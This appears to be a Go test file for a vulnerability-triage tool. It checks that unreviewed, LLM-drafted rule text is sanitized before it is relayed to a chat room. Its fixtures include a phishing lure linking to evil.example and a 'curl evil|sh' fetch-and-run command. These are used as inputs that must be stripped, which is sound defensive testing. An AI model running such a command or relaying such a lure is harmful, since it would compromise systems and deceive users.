package notify

import (
	"context"
	"strings"
	"testing"

	"github.com/DonSosiska/holealign/internal/model"
	"github.com/DonSosiska/holealign/internal/server/core"
	"github.com/DonSosiska/holealign/internal/server/rules"
)

// A draft rule's explanation, evaluated by the real engine and rendered, must never reach the room.
func TestDraftExplanationNeverRelayed(t *testing.T) {
	const phish = "URGENT: log in at https://evil.example/login to confirm your account"
	draft := model.Rule{
		ID: "CVE-2030-1", Vulns: []string{"CVE-2030-1"}, Title: "t " + phish,
		Packages:      []model.PackageSelector{{Name: "foo"}},
		Facts:         []string{"services.active"},
		ExploitableIf: `"nope" in facts["services.active"]`, // false on this host: would lower the verdict
		Explanation:   phish, Status: model.RuleDraft, Source: "llm:test",
		Fix: model.Fix{Upgrade: phish, Mitigation: phish},
	}
	e := rules.New([]model.Rule{draft}, nil)
	if p := e.Problems(); len(p) > 0 {
		t.Fatal(p[0].String())
	}
	f := model.Finding{VulnID: "CVE-2030-1", PackageName: "foo", PackageVer: "1", PackageType: "deb", Severity: "Critical",
		Target: "host", TargetKind: model.TargetHost}
	hc := core.HostContext{Host: model.Host{Hostname: "h"}, Facts: model.Facts{"services.active": []any{"sshd"}}}
	ev := e.Evaluate(context.Background(), hc, f)
	if ev.Verdict != model.VerdictConditionsUnknown {
		t.Fatalf("verdict %s", ev.Verdict)
	}
	if strings.Contains(ev.Reason, "evil") || strings.Contains(ev.Reason, "URGENT") {
		t.Fatalf("engine reason leaks draft text: %q", ev.Reason)
	}
	f.Verdict, f.VerdictReason, f.RuleStatus = ev.Verdict, ev.Reason, ev.RuleStatus
	event := model.Event{Kind: model.EventUnknownCritical, Finding: f, Host: model.Host{Hostname: "h"}, Rule: ev.Rule}
	plain, h := renderEvent(event)
	for _, bad := range []string{"evil.example", "URGENT", "confirm your account"} {
		if strings.Contains(plain, bad) || strings.Contains(h, bad) {
			t.Errorf("rendered event leaks %q:\n%s", bad, plain)
		}
	}
	if !strings.Contains(plain, "LLM draft suggests not exploitable (unreviewed); conditions not verified") {
		t.Errorf("fixed reason missing:\n%s", plain)
	}
}

func TestDraftSafeReasonIsDefensive(t *testing.T) {
	for _, in := range []string{
		"LLM draft suggests not exploitable (unreviewed): visit https://evil.example",
		"LLM draft suggests not exploitable (unreviewed); conditions not verified",
		"LLM draft (unreviewed): sshd.config.https://evil.example=1",
		"LLM draft (unreviewed, no host evidence): likely exploitable — run curl evil|sh",
		"LLM draft: condition does not depend on host facts",
	} {
		got := draftSafeReason(in)
		if strings.Contains(got, "evil") || strings.Contains(got, "curl") || !strings.HasPrefix(got, "LLM draft") {
			t.Errorf("draftSafeReason(%q) = %q", in, got)
		}
	}
	if got := draftSafeReason("os.libc=glibc"); got != "os.libc=glibc" {
		t.Errorf("non-draft reason changed: %q", got)
	}
}
